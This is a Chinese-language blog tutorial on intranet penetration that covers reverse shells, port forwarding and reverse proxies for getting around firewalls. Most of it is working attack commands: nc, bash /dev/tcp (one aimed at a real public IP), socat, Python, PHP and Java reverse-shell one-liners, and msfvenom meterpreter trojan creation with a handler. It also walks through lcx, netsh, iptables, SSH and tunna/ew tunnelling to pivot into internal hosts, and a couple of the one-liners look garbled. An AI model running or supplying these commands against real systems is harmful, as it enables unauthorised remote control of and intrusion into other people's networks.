<!doctype html>
<html lang="en-us">
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">


    <title>内网渗透之内网转发反弹shell端口代理 | 开发者问答集锦</title>
    <meta property="og:title" content="内网渗透之内网转发反弹shell端口代理 - 开发者问答集锦">
    <meta property="og:type" content="article">
        
    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
        
        
    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
        
    <meta name="Keywords" content="">
    <meta name="description" content="内网渗透之内网转发反弹shell端口代理">
        
    <meta name="author" content="">
    <meta property="og:url" content="https://zaina.newban.cn/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91%E5%8F%8D%E5%BC%B9shell%E7%AB%AF%E5%8F%A3%E4%BB%A3%E7%90%86/">
    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">

    <link rel="stylesheet" href='/css/normalize.css'>
    <link rel="stylesheet" href='/css/style.css'>
    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

    
    
    
    
    
    
</head>


<body>
    <header id="header" class="clearfix">
    <div class="container">
        <div class="col-group">
            <div class="site-name ">
                
                    <a id="logo" href="https://zaina.newban.cn">
                        开发者问答集锦
                    </a>
                
                
            </div>
            <div>
                <nav id="nav-menu" class="clearfix">
                    <a class="" href="https://zaina.newban.cn">首页</a>
                    
                </nav>
            </div>
        </div>
    </div>
</header>

    <div id="body">
        <div class="container">
            <div class="col-group">

                <div class="col-8" id="main">
                    
<div class="res-cons">
    
    <article class="post">
        <header>
            <h1 class="post-title">内网渗透之内网转发反弹shell端口代理</h1>
        </header>
        <date class="post-meta meta-date">
            2020年9月2日
        </date>
        
        
        <div class="post-meta">
            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
                    阅读</span></span>
        </div>
        
        
        <div class="post-content">
            

<h1 id="转发目的">转发目的</h1>

<p>渗透测试中，我们往往会面对十分复杂的内网环境，比如最常见的防火墙，它会限制特定端口的数据包出入，此时就需要内网转发</p>

<h1 id="转发情景">转发情景</h1>

<p>1.A可以访问B的80端口，但是不能访问B的3389端口。<br />
2.A可以访问B，B可以访问C，但是A不可以访问C，需要通过B转发数据，让A和C进行通信。</p>

<h1 id="代理方式">代理方式</h1>

<p><strong>正向代理：</strong></p>

<p>正向代理是服务器开放端口，客户端主动访问服务器的端口</p>

<p><a href="https://img.it610.com/image/info8/b991ee1aa69048dda8b9de6f12c7b8bf.jpg"><img src="https://img.it610.com/image/info8/b991ee1aa69048dda8b9de6f12c7b8bf.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第1张图片" /></a><br />
我们常说的代理就是指正向代理，正向代理的过程，它隐藏了真实的请求客户端，服务端不知道真实的客户端是谁，客户端请求的服务都被代理服务器代替来请求。<br />
举个例子在国内用浏览器访问 www.google.com
时，因为防火墙的原因拒绝连接，这时候你可以在国外搭建一台代理服务器，让代理帮你去请求google.com，代理把请求返回的相应结构再返回给你。</p>

<p><strong>反向代理：</strong></p>

<p>反向代理是客户端开发端口，服务器连接客户端</p>

<p><a href="https://img.it610.com/image/info8/45811692a6ee443bad66924f2c254906.jpg"><img src="https://img.it610.com/image/info8/45811692a6ee443bad66924f2c254906.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第2张图片" /></a><br />
反向代理是相对于服务器而言的，当我们请求 www.baidu.com
的时候，背后可能有成千上万台服务器为我们服务，但具体是哪一台，不需要知道，你只需要知道反向代理服务器是谁就好了，www.baidu.com
就是我们的反向代理服务器，反向代理服务器会帮我们把请求转发到真实的服务器那里去，比如说负载均衡。</p>

<h1 id="内网转发形式">内网转发形式</h1>

<p>1.反弹shell：在攻击者机器，获取受害者机器的命令行<br />
2.反弹端口：受害者服务器的某一个端口不能访问，我们通过反弹端口的形式，让攻击者能够访问该端口，也叫端口转发<br />
3.反弹代理：将攻击者的流量转发到内网其他服务器上</p>

<h1 id="反弹shell"><strong>反弹shell</strong></h1>

<h2 id="1-工具nc使用"><strong>1.工具nc使用</strong></h2>

<p><strong>条件：</strong> 能够访问到受害者机器的开放端口<br />
 <strong>方式：</strong> tcp 连接是外网攻击机发起的，连接被控服务器<br />
 <strong>步骤一：</strong> 将被控服务器shell反弹到本地的4444端口，并监听4444端口(受害机输入)</p>

<pre><code>nc -lvp 4444 -e cmd.exe      （反弹windows shell）
nc -lvp 4444 -e /bin/bash     （反弹linux shell）
</code></pre>

<p>此处以windows为例：</p>

<p><a href="https://img.it610.com/image/info8/cf0b7fb5960646b3859f2841473d0e2f.png"><img src="https://img.it610.com/image/info8/cf0b7fb5960646b3859f2841473d0e2f.png" alt="" /></a><br />
<strong>步骤二：</strong> 攻击机连接被控服务器的4444端口(攻击机输入)</p>

<pre><code>nc -vv 受害机ip 4444
</code></pre>

<p><a href="https://img.it610.com/image/info8/5b410d0324eb4e3a98c668da3e4e0ef3.png"><img src="https://img.it610.com/image/info8/5b410d0324eb4e3a98c668da3e4e0ef3.png" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第3张图片" /></a></p>

<h3 id="1-2利用nc反弹shell"><strong>1.2利用nc反弹shell</strong></h3>

<p><strong>条件：</strong> 防火墙开启，不允许访问目标端口(可直接关闭目标机防火墙，权限不够时利用nc反向连接)<br />
 <strong>方式：</strong> tcp连接是被控服务器发起，连接外网攻击机<br />
 <strong>步骤一：</strong> 外网服务器监听4444端口<br />
(攻击机输入)</p>

<pre><code>nc -lvp 4444
</code></pre>

<p><a href="https://img.it610.com/image/info8/27e9192483f54ec6a22acf31cd5576d7.png"><img src="https://img.it610.com/image/info8/27e9192483f54ec6a22acf31cd5576d7.png" alt="" /></a><br />
<strong>步骤二：</strong> 在被控服务器反弹shell到外网服务器的4444端口<br />
(受害机输入)</p>

<pre><code>nc -e cmd.exe 攻击机ip 4444（反弹windows shell）
nc -e /bin/bash 攻击机ip 4444（反弹linux shell）
</code></pre>

<p>此处以windows为例：</p>

<p><a href="https://img.it610.com/image/info8/16b72c13991b4c948fcde3deab8fcbd6.jpg"><img src="https://img.it610.com/image/info8/16b72c13991b4c948fcde3deab8fcbd6.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第4张图片" /></a></p>

<h2 id="2-工具msf使用">2.工具msf使用</h2>

<h3 id="2-1-msfconsole"><strong>2.1 msfconsole</strong></h3>

<p><strong>作用：</strong> 管理生成exp，管理反弹的shell，通过反弹的shell进行后渗透。。。</p>

<p><strong>模块介绍：</strong></p>

<p>exploits：攻击脚本<br />
payloads：攻击载荷(攻击效果控制)<br />
auxiliaru：辅助模块(扫描工具等)<br />
post：后渗透模块(提取信息)<br />
encoders编码模块<br />
nops:无操作生成器</p>

<h3 id="2-2-msfvenom"><strong>2.2 msfvenom</strong></h3>

<p>作用：制作木马</p>

<h3 id="2-3-msfencode"><strong>2.3 msfencode</strong></h3>

<p>作用：对木马进行编码</p>

<h3 id="2-4-msf使用"><strong>2.4 msf使用：</strong></h3>

<p>请点击此链接查看我的另一篇文章，介绍了msf具体使用</p>

<h2 id="3-其他linux反弹shell方法"><strong>3. 其他Linux反弹shell方法</strong></h2>

<h3 id="方式"><strong>方式：</strong></h3>

<p><strong>利用系统自带的bash和gawk</strong><br />
 <strong>利用脚本：</strong> python、perl、ruby、lua、php、jsp、aspx<br />
 <strong>利用第三方服务或工具：</strong> elnet、xterm、socat、nc</p>

<h3 id="例"><strong>例：</strong></h3>

<p><strong>3.1.1 nc发送shell</strong><br />
发送端(公网服务器)：</p>

<pre><code>nc -lvvp 6666 -e /bin/bash
</code></pre>

<p>接收端：</p>

<pre><code>nc 发送端ip 发送端攻击者ip
</code></pre>

<p><strong>3.1.2 nc反弹shell</strong><br />
接收端：</p>

<pre><code>nc -lvvp 6666
</code></pre>

<p>发送端(内网网服务器)：</p>

<pre><code>nc 接收端ip 接收端端口 -e /bin/bash
</code></pre>

<p><strong>3.2 bash反弹</strong><br />
接收端(hackip,公网)：</p>

<pre><code>nc -lvvp 端口
</code></pre>

<p><a href="https://img.it610.com/image/info8/2fe8cab5e11a44e890f519f63f7c365a.jpg"><img src="https://img.it610.com/image/info8/2fe8cab5e11a44e890f519f63f7c365a.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第5张图片" /></a></p>

<p>发送端(受害者)：</p>

<pre><code>bash -i &gt;&amp; /dev/tcp/111.230.170.95/9985 0&gt;&amp;1
</code></pre>

<p><a href="https://img.it610.com/image/info8/dfc9905b33cc471784e296deb095cc31.jpg"><img src="https://img.it610.com/image/info8/dfc9905b33cc471784e296deb095cc31.jpg" alt="" /></a></p>

<p>或者发送端(受害者)：</p>

<pre><code>0/dev/tcp/111.230.170.95/9985;sh &amp;31 2&gt;&amp;31
</code></pre>

<p><strong>3.3.1 socat反弹(tcp)</strong><br />
接收端(攻击机)：</p>

<pre><code>./socat TCP-LISTEN:端口
</code></pre>

<p>发送端(靶机)：</p>

<pre><code>./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:攻击机ip:攻击机端口
</code></pre>

<p><strong>3.3.2 socat反弹(udp)</strong><br />
接收端:</p>

<pre><code>nc -lvvp 8080
</code></pre>

<p>发送端:</p>

<pre><code>socat udp-connect:攻击者ip:端口 exec:'bash -li',pty,stderr,sane 2&gt;&amp;1&gt;/dev/null &amp;
</code></pre>

<p><strong>3.4 python反弹</strong></p>

<p>接收端(攻击机,外网)：</p>

<pre><code>nc -lvvp 端口
</code></pre>

<p><a href="https://img.it610.com/image/info8/6a9ecddc2c9142269ba7797b78c519e2.png"><img src="https://img.it610.com/image/info8/6a9ecddc2c9142269ba7797b78c519e2.png" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第6张图片" /></a></p>

<p>发送端(靶机)：</p>

<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;接收端ip&quot;,接收端端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
</code></pre>

<p><a href="https://img.it610.com/image/info8/0905adf1580e446193a5e5b47850b046.jpg"><img src="https://img.it610.com/image/info8/0905adf1580e446193a5e5b47850b046.jpg" alt="" /></a></p>

<p><strong>3.5 PHP反弹</strong><br />
接收端：</p>

<pre><code>nc -lvvp 端口
</code></pre>

<p>发送端：</p>

<pre><code>php -r '$sock=fsockopen(&quot;攻击者ip&quot;,端口);exec(&quot;/bin/sh -i &amp;3 2&gt;&amp;3&quot;);'
</code></pre>

<p><strong>3.6 JAVA反弹</strong><br />
接收端：</p>

<pre><code>nc -lvvp 端口
</code></pre>

<p>发送端：</p>

<pre><code>r = Runtime.getRuntime()
p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/攻击者ip/端口;cat &amp;5 &gt;&amp;5; done&quot;] as String[])
p.waitFor()
</code></pre>

<h1 id="反弹端口-此处以3389为例">反弹端口（此处以3389为例）</h1>

<h2 id="条件">条件</h2>

<p>1.访问服务器的3389端口时，由于一些原因无法访问<br />
原因：1.3389端口，防火墙没有开放 2.服务器处于公司内网，对外只发布了80端口 3.3389端口只允许内网连接&hellip;&hellip;&hellip;&hellip;&hellip;..<br />
2.服务器处于公司内网，我们没有办法直接访问服务器<br />
3.服务器处于公司内网，且无法与外网服务器直接通信，无法反弹shell</p>

<h2 id="lcx工具使用">lcx工具使用</h2>

<h3 id="lcx简要使用介绍">Lcx简要使用介绍</h3>

<p><strong>三种模式</strong><br />
listen：监听，同时监听两个端口：第一个是服务器开放的，第二个是在本地新开一个用来操作的<br />
tran：转发，将一个端口的流量转发到另一个端口<br />
slave： 将一个外网端口和一个内网端口进行连接</p>

<h3 id="先将lcx上传到目标服务器-有时还需要上传到内网边界机-之后再从以下几种转发方式进行选择">先将lcx上传到目标服务器（有时还需要上传到内网边界机），之后再从以下几种转发方式进行选择</h3>

<h3 id="lcx正向端口转发">LCX正向端口转发</h3>

<p><strong>环境：</strong> 3389端口不对外开放，但是1234端口对外开放</p>

<p><strong>作用：</strong><br />
一般对外的服务器，80,8080,53,21等等，3389端口没有对外开放，但是有其他端口对外开放，此时可以本地端口转发，转发的端口必须没有被其他服务占用</p>

<p><strong>基本：(防火墙允许3389流量通过)</strong></p>

<p>1.被控服务器输入命令将3389端口转发到本地(被控服务器)的1234端口（本地端口转发）</p>

<pre><code>lcx -tran 1234 127.0.0.1 3389
</code></pre>

<p><a href="https://img.it610.com/image/info8/4259559070a142c0bd923f8745141a9f.png"><img src="https://img.it610.com/image/info8/4259559070a142c0bd923f8745141a9f.png" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第7张图片" /></a></p>

<p>2.攻击机连接被控服务器的1234端口（mstsc远程）</p>

<p><a href="https://img.it610.com/image/info8/4dd9ddbd8ae94481899cc146e2b8b0c3.jpg"><img src="https://img.it610.com/image/info8/4dd9ddbd8ae94481899cc146e2b8b0c3.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第8张图片" /></a></p>

<p><strong>进阶：（防火墙不允许3389端口流量通过）</strong></p>

<p><a href="https://img.it610.com/image/info8/23fc14395ed14433af8839dfa65c216b.png"><img src="https://img.it610.com/image/info8/23fc14395ed14433af8839dfa65c216b.png" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第9张图片" /></a></p>

<p><strong>使用reduh来进行转发:</strong></p>

<p>思路：Mstsc客户端–&gt;reDuh 代理–&gt;HTTP tunne–&gt;Web 服务器–&gt;3389</p>

<p>具体使用过程见本人的另一篇文章，点击此处跳转</p>

<h3 id="lcx反向端口转发">LCX反向端口转发</h3>

<p>1.攻击机开启监听</p>

<pre><code>lcx -listen 4444 12345
</code></pre>

<p><a href="https://img.it610.com/image/info8/b267b6c2a30348ec875b3b3e2bd3bbe5.jpg"><img src="https://img.it610.com/image/info8/b267b6c2a30348ec875b3b3e2bd3bbe5.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第10张图片" /></a></p>

<p>2.被控服务器输入命令，将端口转发到攻击机</p>

<pre><code>lcx.exe -slave 攻击机IP 端口 被控服务器IP 端口
</code></pre>

<p><a href="https://img.it610.com/image/info8/e3154fa7e41a444686701b7b44fef6fd.png"><img src="https://img.it610.com/image/info8/e3154fa7e41a444686701b7b44fef6fd.png" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第11张图片" /></a></p>

<p>3. 攻击机连接本地的12345端口（mstsc远程，127.0.0.1:12345）</p>

<p><a href="https://img.it610.com/image/info8/be05db3fb67d4e2ab7948fcc3c1b6d0e.jpg"><img src="https://img.it610.com/image/info8/be05db3fb67d4e2ab7948fcc3c1b6d0e.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第12张图片" /></a></p>

<h3 id="lcx多级级联反弹内网主机端口">lcx多级级联反弹内网主机端口</h3>

<p><strong>网络配置情况</strong></p>

<p>内网边界机2有两个网卡，一个与攻击机1同网段，一个与目标服务器3同网段(攻击机1的ip：192.168.0.106，内网边界机2的ip：192.168.16.129和10.1.1.1，目标服务器3的ip：10.1.1.2)此时1-2，2-3通，1-3不通</p>

<p><strong>情况一</strong></p>

<p><strong>环境：</strong> 目标服务器3不能访问外网攻击机1，但是可以访问同网段的内网边界机2，同时目标服务器3的3389端口只能内网边界机2访问</p>

<p>1.攻击机1开启监听</p>

<pre><code>lcx -listen 4444 12345
</code></pre>

<p><a href="https://img.it610.com/image/info8/0ede99e835624910906dbd9b336220a4.jpg"><img src="https://img.it610.com/image/info8/0ede99e835624910906dbd9b336220a4.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第13张图片" /></a></p>

<p>2.内网边界机2输入命令，将端口转发到攻击机1</p>

<pre><code>lcx.exe -slave 攻击机1IP  端口 目标服务器3IP  端口
</code></pre>

<p><a href="https://img.it610.com/image/info8/567a275e5dfb4103a582911a0586beb3.png"><img src="https://img.it610.com/image/info8/567a275e5dfb4103a582911a0586beb3.png" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第14张图片" /></a></p>

<p>3.在攻击机1连接本地12345端口(mstsc远程，127.0.0.1:12345)</p>

<p><a href="https://img.it610.com/image/info8/5bbfe2941bdb4209a40341d02be833b0.jpg"><img src="https://img.it610.com/image/info8/5bbfe2941bdb4209a40341d02be833b0.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第15张图片" /></a></p>

<p><strong>情况二</strong></p>

<p><strong>环境：</strong> 目标服务器3不能访问外网攻击机1，但是可以访问同网段的内网边界机2，同时3389端口只能本地访问，但是8080端口对外开放。</p>

<p>1.目标服务器3输入命令将3389端口转发到本地的8080端口</p>

<pre><code>lcx -tran 8080 127.0.0.1 3389
</code></pre>

<p><a href="https://img.it610.com/image/info8/2ced38817b0d47f681ff6d8a7479f18b.png"><img src="https://img.it610.com/image/info8/2ced38817b0d47f681ff6d8a7479f18b.png" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第16张图片" /></a></p>

<p>2.在内网边界机2输入命令，将目标服务器3的8080端口转发到攻击机1</p>

<pre><code>lcx -slave 攻击机1IP 端口 目标服务器3IP 端口
</code></pre>

<p><a href="https://img.it610.com/image/info8/c1d0ec2fb1e544e597718acffea57795.png"><img src="https://img.it610.com/image/info8/c1d0ec2fb1e544e597718acffea57795.png" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第17张图片" /></a></p>

<p>3.在攻击机1上监听端口</p>

<pre><code>lcx –listen 4444 12345
</code></pre>

<p><a href="https://img.it610.com/image/info8/af047878f4b94754999b7aa49f79da81.jpg"><img src="https://img.it610.com/image/info8/af047878f4b94754999b7aa49f79da81.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第18张图片" /></a></p>

<p>4.外网攻击机1连接本地12345端口(mstsc远程，127.0.0.1:12345)</p>

<p><a href="https://img.it610.com/image/info8/404c027b18d7432691f09faf51f304bf.jpg"><img src="https://img.it610.com/image/info8/404c027b18d7432691f09faf51f304bf.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第19张图片" /></a></p>

<h2 id="利用netsh-windows防火墙">利用netsh(windows防火墙)</h2>

<p><strong>条件：</strong></p>

<p>要求至少管理员权限，此工具适用于，有一台双网卡服务器(内网边缘机)，你可以通过它进行内网通信，比如连接192.168.206.101:3388端口是连接到192.168.206.100上面的3389，以下操作都是在边缘机进行</p>

<p><strong>1.边缘机添加转发规则</strong></p>

<pre><code>netsh interface portproxy set v4tov4 listenaddress=外网可访问地址(服务器外网ip) listenport=外网可访问端口 connectaddress=内网目标想要访问的地址(内网同网段其他机或本机ip都可) connectport=内网目标想要访问的端口
</code></pre>

<p>#
<a href="https://img.it610.com/image/info8/15c673963d8c49b1a322df01d42ef73b.png"><img src="https://img.it610.com/image/info8/15c673963d8c49b1a322df01d42ef73b.png" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第20张图片" /></a></p>

<p><strong>边缘机放行防火墙端口</strong></p>

<pre><code>netsh advfirewall firewall add rule name=&quot;mysql&quot; dir=in protocol=tcp localport=要放行的端口 action=allow
</code></pre>

<p><a href="https://img.it610.com/image/info8/6a4be7e996e74bd89561986fbbd8bddb.png"><img src="https://img.it610.com/image/info8/6a4be7e996e74bd89561986fbbd8bddb.png" alt="" /></a></p>

<p><strong>3.边缘机删除转发规则</strong></p>

<pre><code>netsh interface portproxy delete v4tov4 listenport=外网可访问端口 listenaddress=外网可访问地址(服务器外网ip)
</code></pre>

<p><strong>4.边缘机查看现有规则</strong></p>

<pre><code>netsh interface portproxy show all
</code></pre>

<p><a href="https://img.it610.com/image/info8/45cd7ddca9dc41a3ae6b6b6202333de3.png"><img src="https://img.it610.com/image/info8/45cd7ddca9dc41a3ae6b6b6202333de3.png" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第21张图片" /></a></p>

<p><strong>5.之后直接访问边缘机2222端口</strong></p>

<p><a href="https://img.it610.com/image/info8/56cf57debaf94bcab1c2c2808ecb258e.jpg"><img src="https://img.it610.com/image/info8/56cf57debaf94bcab1c2c2808ecb258e.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第22张图片" /></a></p>

<h2 id="http隧道tunna端口转发">http隧道tunna端口转发</h2>

<p>tunna基本使用：-s不能中断 -v显示详细信息 -u指定地址 -a指定远程地址</p>

<p><strong>1.上传tunna里的webshell到边缘服务器</strong></p>

<p><strong>2.在攻击机输入命令，将目标服务器3389转发到本地(攻击机)1234</strong></p>

<pre><code>python proxy.py -u http://192.168.16.141/conn.aspx(webshell上传路径) -l 1234 -a 内网目标服务器ip -r 3389 -s -v
</code></pre>

<p><a href="https://img.it610.com/image/info8/62340dbf569543de823899f7bccc11f1.jpg"><img src="https://img.it610.com/image/info8/62340dbf569543de823899f7bccc11f1.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第23张图片" /></a></p>

<p><strong>3.直接访问本机的1234端口</strong></p>

<p><a href="https://img.it610.com/image/info8/47d374e0ddf245dcad7a1b41171fdcf2.jpg"><img src="https://img.it610.com/image/info8/47d374e0ddf245dcad7a1b41171fdcf2.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第24张图片" /></a></p>

<h2 id="利用-iptables-linux防火墙"><strong>利用 iptables(linux防火墙)</strong></h2>

<p><strong>1.编辑配置文件</strong></p>

<pre><code>/etc/sysctl.conf的net.ipv4.ip_forward = 1
</code></pre>

<p><strong>2.关闭服务</strong></p>

<pre><code>service iptables stop
</code></pre>

<p><strong>3.配置规则</strong></p>

<pre><code>iptables -t nat -A PREROUTING --dst 内网边界服务器ip -p tcp --dport 3389 -j DNAT --to-destination 需要访问的内网地址ip:3389
iptables -t nat -A POSTROUTING --dst 需要访问的内网地址ip -p tcp --dport 3389 -j SNAT --to-source 内网边界服务器ip
</code></pre>

<p><strong>4.保存 &amp;&amp;重启服务</strong></p>

<pre><code>service iptables save &amp;&amp; service iptables start
</code></pre>

<h2 id="ssh隧道端口转发">ssh隧道端口转发</h2>

<p>基本使用：-L 本地 -R 远程</p>

<h3 id="本地转发-正向代理">本地转发(正向代理)</h3>

<p><strong>1.攻击机输入命令，之后输密码(对应用户)</strong></p>

<pre><code>ssh -CfNg -L 转发后的端口:目标服务器ip:转发的端口 边缘服务器用户@边缘服务器ip
</code></pre>

<p><a href="https://img.it610.com/image/info8/0afdcd0c9d4148d1ae7313cc92bae685.jpg"><img src="https://img.it610.com/image/info8/0afdcd0c9d4148d1ae7313cc92bae685.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第25张图片" /></a></p>

<p><strong>2.攻击机连接本地的4444端口就连接到了目标服务器的3389端口</strong></p>

<pre><code>rdesktop  127.0.0.1:4444
</code></pre>

<p><a href="https://img.it610.com/image/info8/28f3bf1187c947cc8ec1ad704c2fdd56.jpg"><img src="https://img.it610.com/image/info8/28f3bf1187c947cc8ec1ad704c2fdd56.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第26张图片" /></a></p>

<h3 id="远程转发-反向代理">远程转发(反向代理)</h3>

<p><strong>1.边缘服务器输入命令，之后输密码(对应用户)</strong></p>

<pre><code>ssh -CfNg -R 转发后的端口:目标服务器ip:转发的端口 攻击机用户@攻击机ip
</code></pre>

<p><a href="https://img.it610.com/image/info8/619090578084442c901e939e71637928.png"><img src="https://img.it610.com/image/info8/619090578084442c901e939e71637928.png" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第27张图片" /></a></p>

<p>2.此时攻击机3333端口开启，直接连接本机的3333端口</p>

<pre><code>rdesktop 127.0.0.1:3333
</code></pre>

<p>#</p>

<p><a href="https://img.it610.com/image/info8/cd68fd5c85744955815c3225a66960a6.jpg"><img src="https://img.it610.com/image/info8/cd68fd5c85744955815c3225a66960a6.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第28张图片" /></a></p>

<p><a href="https://img.it610.com/image/info8/9965528519574fa0b22b1061d15e8619.jpg"><img src="https://img.it610.com/image/info8/9965528519574fa0b22b1061d15e8619.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第29张图片" /></a></p>

<h3 id="动态隧道-转发所有流量">动态隧道(转发所有流量)</h3>

<p><strong>1.攻击机输入命令，之后输密码(对应用户)</strong></p>

<pre><code>ssh -CfNg -D 本地开放端口 边缘服务器用户@边缘服务器ip
</code></pre>

<p><a href="https://img.it610.com/image/info8/913cdc8f8e4a43a18bc0434016ed7bb4.jpg"><img src="https://img.it610.com/image/info8/913cdc8f8e4a43a18bc0434016ed7bb4.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第30张图片" /></a></p>

<p><strong>2.攻击机火狐浏览器网络设置里的连接设为访问流量走7000端口隧道(或者直接bp设置代理)，之后直接访问基本的一些端口都可以访问</strong></p>

<p><a href="https://img.it610.com/image/info8/e76463422ea244c0afd0538abb42e605.jpg"><img src="https://img.it610.com/image/info8/e76463422ea244c0afd0538abb42e605.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第31张图片" /></a></p>

<p><a href="https://img.it610.com/image/info8/87f2c24ab5484453b44815c1bd408f32.jpg"><img src="https://img.it610.com/image/info8/87f2c24ab5484453b44815c1bd408f32.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第32张图片" /></a></p>

<h1 id="反弹shell与反弹端口结合使用">反弹shell与反弹端口结合使用</h1>

<h3 id="网络配置情况">网络配置情况</h3>

<p>内网边界机2有两个网卡，一个与攻击机1同网段，一个与目标服务器3同网段(攻击机1的ip：192.168.16.130，内网边界机2的ip：192.168.16.129和10.1.1.1，目标服务器3的ip：10.1.1.2)此时1-2，2-3通，1-3不通</p>

<h3 id="环境">环境</h3>

<p>有时我们无法直接访问目标服务器，也就无法反弹shell，此时就需要一个内网的边缘机来进行转发端口，通过这个转发的端口再进行反弹shell</p>

<h3 id="使用方法">使用方法</h3>

<p><strong>1.攻击机输入msfconsole打开msf(msf具体使用见上面链接)，选择合适的payload：windows/meterpreter/reverse_tcp</strong></p>

<p><a href="https://img.it610.com/image/info8/8d205813ce774cd896e09a869d1e186d.jpg"><img src="https://img.it610.com/image/info8/8d205813ce774cd896e09a869d1e186d.jpg" alt="" /></a></p>

<p><strong>2.选择此payload，并制作对应的木马</strong></p>

<p><strong>选择payload：</strong></p>

<pre><code>use windows/meterpreter/reverse_tcp
</code></pre>

<p><a href="https://img.it610.com/image/info8/8924ad7d4b0541978b7f09237fa141ed.jpg"><img src="https://img.it610.com/image/info8/8924ad7d4b0541978b7f09237fa141ed.jpg" alt="" /></a></p>

<p><strong>制作木马：</strong></p>

<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.1.1.1(内网边界机2的内网ip) lport=12345(端口) -o 111.exe
</code></pre>

<p><a href="https://img.it610.com/image/info8/8a09daedc7234effaeac6ca98be70621.jpg"><img src="https://img.it610.com/image/info8/8a09daedc7234effaeac6ca98be70621.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第33张图片" /></a></p>

<p><strong>3.上传111.exe到目标服务器3</strong></p>

<p><a href="https://img.it610.com/image/info8/1a016bed7b514b8f9e4da2c844d187c7.png"><img src="https://img.it610.com/image/info8/1a016bed7b514b8f9e4da2c844d187c7.png" alt="" /></a></p>

<p><strong>4.攻击机1开启监听</strong></p>

<pre><code>use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.16.130(本机ip)
exploit
</code></pre>

<p><a href="https://img.it610.com/image/info8/1064d031e4df4a408ca1d23ca44a7552.jpg"><img src="https://img.it610.com/image/info8/1064d031e4df4a408ca1d23ca44a7552.jpg" alt="" /></a></p>

<p><a href="https://img.it610.com/image/info8/4dbb6791cc624f9a95c3129932152ce7.jpg"><img src="https://img.it610.com/image/info8/4dbb6791cc624f9a95c3129932152ce7.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第34张图片" /></a></p>

<p><strong>5.内网边界机2输入命令将12345端口转发到攻击机1的4444端口</strong></p>

<pre><code>lcx -tran 12345 192.168.16.130 4444
</code></pre>

<p><a href="https://img.it610.com/image/info8/729155826f3f46de9fbfd5e7a0ab35d2.png"><img src="https://img.it610.com/image/info8/729155826f3f46de9fbfd5e7a0ab35d2.png" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第35张图片" /></a></p>

<p><strong>6.目标服务器3运行111.exe将1234端口发送到内网边界机2，再由内网边界机2将1234端口转发成4444端口发送给攻击机1，攻击机1就会接收到目标服务器3的shell</strong></p>

<p><a href="https://img.it610.com/image/info8/d572619ffd2f41df8f1ee074cee766d9.jpg"><img src="https://img.it610.com/image/info8/d572619ffd2f41df8f1ee074cee766d9.jpg" alt="内网渗透之——内网转发（反弹shell、端口、代理）_第36张图片" /></a></p>

<h1 id="反弹代理">反弹代理</h1>

<h2 id="介绍">介绍</h2>

<p>内网渗透不光只是反弹一个shell，反弹一个端口，我们更需要对内网进行更深一步的扫描和渗透，这时候就需要设置找到一个代理服务器，充当外网和内网数据转发的节点母的，所以出现了反弹代理，也叫反弹socket，进行反弹代理后，就可以访问目标机的所有端口了</p>

<h2 id="工具ew">工具ew</h2>

<h3 id="正向代理">正向代理</h3>

<p><strong>攻击机为windows</strong></p>

<p><strong>1.选择合适的ew文件，上传到边缘服务器</strong></p>

<p><strong>2.边缘服务器输入</strong></p>

<pre><code>ew.exe -s ssocksd -l 8000
</code></pre>

